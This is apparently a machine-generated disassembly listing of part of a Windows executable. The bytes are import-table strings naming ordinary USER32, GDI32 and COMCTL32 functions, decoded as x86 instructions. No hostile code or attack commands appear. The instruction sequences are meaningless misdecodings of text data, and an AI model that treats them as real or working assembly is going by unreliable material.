  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
